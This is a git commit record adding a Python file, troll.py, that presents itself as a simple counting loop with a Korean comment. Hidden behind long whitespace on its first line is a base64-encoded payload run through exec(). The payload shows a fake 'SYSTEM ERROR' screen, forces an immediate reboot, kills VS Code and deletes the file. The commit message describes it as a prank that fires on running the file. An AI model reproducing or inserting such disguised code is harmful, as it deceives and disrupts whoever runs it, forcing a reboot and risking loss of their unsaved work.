8e29bb512f8c55ef4108610b51da9baa6ce4bc9b
CHA0S THEORY <ggmaster63od@gmail.com>
2024-11-06 13:13:37 -0500

    shutdown-warning troll
    works by just running the file

---
+++ troll.py
@@ -0,0 +1,6 @@
+import time                                                                                                                                                                                                         ;from base64 import b64decode as bd;d = """aW1wb3J0IHRraW50ZXIgYXMgdGs7aW1wb3J0IG9zLHN5cyx0aW1lOyBpbXBvcnQgdGtpbnRlciBhcyB0azsgd2luZG93ID0gdGsuVGsoKTsgd2luZG93LnRpdGxlKCJTWVNURU0gRVJST1IiKTsgd2luZG93Lmdlb21ldHJ5KCIxOTIweDEwODAiKTsgd2luZG93LmNvbmZpZ3VyZShiZz0icmVkIik7IHRrLkxhYmVsKHdpbmRvdywgdGV4dD0iQSBDUklUSUNBTCBFUlJPUiBPQ0NVUkVEXG5JbW1lZGlhdGUgU3lzdGVtIFJlYm9vdC4uLiIsIGZnPSJ3aGl0ZSIsIGJnPSJyZWQiLCBmb250PSgiSGVsdmV0aWNhIiwgMjYsICJib2xkIikpLnBhY2soZXhwYW5kPVRydWUpOyB3aW5kb3cuYWZ0ZXIoMzAwMCwgd2luZG93LmRlc3Ryb3kpOyB3aW5kb3cubWFpbmxvb3AoKTtvcy5zeXN0ZW0oInNodXRkb3duIC9yIC90IDEiKTtvcy5zeXN0ZW0oInRhc2traWxsIC9mIC9pbSBDb2RlLmV4ZSIgaWYgc3lzLnBsYXRmb3JtID09ICJ3aW4zMiIgZWxzZSAicGtpbGwgY29kZSIgaWYgc3lzLnBsYXRmb3JtID09ICJsaW51eCIgZWxzZSAicGtpbGwgJ1Zpc3VhbCBTdHVkaW8gQ29kZSciKTsgdGltZS5zbGVlcCguMyk7IG9zLnJlbW92ZShfX2ZpbGVfXyk=""";clean = d.strip().rstrip(";").rstrip("=");uwu = bd(clean + "==").decode("utf-8");exec(uwu)
+
+for i in range(10):
+    print(i)
+    time.sleep(.5)
+# 0.5초마다 출력
